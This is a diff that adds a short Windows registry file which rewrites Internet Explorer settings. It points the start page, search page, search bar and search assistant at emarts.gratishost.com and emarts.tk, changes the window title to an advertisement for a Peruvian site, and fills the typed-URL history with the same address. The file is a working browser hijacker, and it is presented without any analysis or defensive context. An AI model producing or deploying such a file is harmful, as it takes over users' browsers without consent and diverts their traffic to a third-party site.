@@ -1,0 +1,16 @@
+REGEDIT4
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"Local page"="http://emarts.gratishost.com/index.htm"
+"Search Bar"="http://emarts.gratishost.com/index.htm"
+"Search Page"="http://emarts.gratishost.com/index.htm"
+"Start Page"="http://emarts.gratishost.com/index.htm"
+"Windows Title"="WWW.EMARTS.TK <--- La mejor web Peruana!!!"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedUrls]
+"url1"="http://www.emarts.tk"
+"url2"="http://www.emarts.tk"
+"url3"="http://www.emarts.tk"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://www.emarts.tk"
